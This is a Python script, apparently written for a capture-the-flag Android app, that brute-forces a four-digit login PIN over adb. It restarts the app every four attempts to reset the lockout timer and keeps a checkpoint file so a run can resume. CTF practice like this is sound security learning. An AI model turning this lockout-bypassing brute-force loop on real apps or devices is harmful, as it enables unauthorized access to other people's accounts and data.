import subprocess
import time
import os

# Define the package name and main activity of the app
PACKAGE_NAME = 'uz.jsmx.ctf'
MAIN_ACTIVITY = 'MainActivity'
CHECKPOINT_FILE = 'checkpoint.txt'

def send_keyevent(keycode):
    subprocess.run(['adb', 'shell', 'input', 'keyevent', str(keycode)])

def send_text(text):
    subprocess.run(['adb', 'shell', 'input', 'text', text])

def check_success():
    # Implement a method to check if login was successful
    # This can be done by checking the app's current activity or UI state
    output = subprocess.run(['adb', 'shell', 'dumpsys', 'window', 'windows'], capture_output=True, text=True)
    if "DesiredSuccessIndicator" in output.stdout:  # Replace with actual success indicator
        return True
    return False

def clear_input():
    for _ in range(4):
        send_keyevent(67)
        send_keyevent(67)
        send_keyevent(67)
        send_keyevent(67)  # Keycode 67 for backspace
        time.sleep(0.2)    # Small delay to ensure each backspace is registered

def restart_app():
    subprocess.run(['adb', 'shell', 'am', 'force-stop', PACKAGE_NAME])
    time.sleep(0.2)  # Wait for the app to close
    subprocess.run(['adb', 'shell', 'am', 'start', '-n', f'{PACKAGE_NAME}/{MAIN_ACTIVITY}'])
    time.sleep(0.3)  # Wait for the app to start

def save_checkpoint(number):
    with open(CHECKPOINT_FILE, 'w') as file:
        file.write(str(number))

def load_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        with open(CHECKPOINT_FILE, 'r') as file:
            return int(file.read().strip())
    return 0

def brute_force_login():
    start_number = load_checkpoint()
    print(f"Resuming from checkpoint: {start_number}")
    
    for number in range(start_number, 10000):
        pin = f"{number:04d}"  # Format number as 4-digit string
        print(f"Trying PIN: {pin}")
        send_text(pin)
        time.sleep(0.5)  # Wait for the input to be registered (adjust as needed)
        send_keyevent(66)  # Press Enter key to submit the form (keycode 66)
        time.sleep(0.5)  # Wait for the response (adjust as needed)
        
        if check_success():
            print(f"Success! The PIN is: {pin}")
            break
        
        clear_input()  # Clear the input field

        if (number + 1) % 4 == 0:
            print("Restarting app to reset timer.")
            restart_app()
        
        if (number + 1) % 10 == 0:
            save_checkpoint(number + 1)
            print(f"Checkpoint saved at: {number + 1}")

if __name__ == "__main__":
    brute_force_login()

